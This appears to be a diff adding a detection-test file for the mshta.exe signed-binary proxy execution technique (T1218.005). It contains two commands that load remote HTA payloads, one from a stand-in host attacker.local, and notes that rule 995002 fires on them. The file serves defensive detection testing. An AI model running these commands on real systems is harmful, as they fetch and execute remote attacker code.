@@ -1,1 +1,12 @@
+# LOLBAS: mshta.exe – Remote HTA / URL Execution
+# Technique: T1218.005 (Signed Binary Proxy Execution: mshta)
 
+# 1) Load remote HTA from attacker-controlled server (fires 995002)
+mshta.exe http://attacker.local/payload.hta
+
+# 2) Load remote HTA via HTTPS (fires 995002)
+mshta.exe https://example.com/test.hta
+
+# Purpose:
+# Simulates mshta.exe fetching and running remote .hta scripts, a common
+# technique in phishing payload chains and malware stagers.
